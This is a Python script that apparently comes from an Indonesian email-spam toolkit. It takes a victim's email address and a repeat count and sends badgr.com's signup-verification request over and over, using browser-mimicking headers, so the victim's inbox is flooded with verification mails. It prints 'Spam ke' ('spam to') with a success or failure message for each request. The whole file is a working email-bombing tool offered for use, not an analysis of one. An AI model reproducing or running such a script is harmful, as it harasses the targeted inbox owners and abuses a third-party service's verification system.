import requests,os,sys,json
from time import sleep
from war.war import *

def mai(mail, jml):
	sleep(2)
	print("")
	r = requests.Session()
	dat = json.dumps({
	  "currentIds": [
	    {
	      "@type": "PublicFrontendConfigApiEntityId",
	      "configId": "5e1fd61f46e0fb003432e75e"
	    },
	    {
	      "@type": "AuthContextApiEntityId"
	    },
	    {
	      "@type": "PublicBadgrServerApiEntityId",
	      "badgrServerId": "5ab9592bb6bfaa39af3f3e8f"
	    },
	    {
	      "@type": "PublicSSOProviderApiEntityId",
	      "slug": "facebook"
	    },
	    {
	      "@type": "PublicSSOProviderApiEntityId",
	      "slug": "google"
	    },
	    {
	      "@type": "PublicSSOProviderApiEntityId",
	      "slug": "azure"
	    },
	    {
	      "@type": "PublicSSOProviderApiEntityId",
	      "slug": "linkedin_oauth2"
	    },
	    {
	      "@type": "PublicSSOProviderApiEntityId",
	      "slug": "kony"
	    },
	    {
	      "@type": "PublicSSOProviderApiEntityId",
	      "slug": "twitter"
	    },
	    {
	      "@type": "PublicSSOProvidersForFrontendConfigEntityGroupId",
	      "frontendConfigId": "5e1fd61f46e0fb003432e75e"
	    },
	    {
	      "@type": "LinkedSocialAccountsForAuthContextApiEntityId"
	    },
	    {
	      "@type": "PendingInvitationsForAuthContextApiEntityGroupId"
	    },
	    {
	      "@type": "AllPublicBadgrServersApiEntityGroupId"
	    },
	    {
	      "@type": "PublicOrganizationsForAuthContextApiEntityGroupId"
	    },
	    {
	      "@type": "AuthoringIssuersForAuthContextApiEntityGroupId"
	    }
	  ],
	  "actions": [
	    {
	      "frontendDomain": "badgr.com",
	      "badgrServerId": "5ab9592bb6bfaa39af3f3e8f",
	      "recipientIdentifier": {
	        "type": "email",
	        "value": mail
	      },
	      "@type": "RequestRecipientIdentifierVerificationApiEntityAction"
	    }
	  ],
	  "requestedIds": [],
	  "@type": "ApiEntityRequest"
	})

	head = {
	"Host": "badgr.com",
	"content-length": "1253",
	"accept": "application/json, text/plain, */*",
	"user-agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"content-type": "text/plain",
	"origin": "https://badgr.com",
	"referer": "https://badgr.com/auth/signup",
	}

	for x in range(jml):
	  cal = r.post("https://badgr.com/api/ui/entity",headers=head,data=dat)
	  if '@type' in cal.text:
	       print(f"{k}[+] {c}Spam ke {k}{mail} {c}Berhasil ")
	       sleep(1.5)
	  else:
	       print(f"{k}[+] {c}Spam ke {k}{mail} {c}Gagal!! ")
	       sleep(1.5)
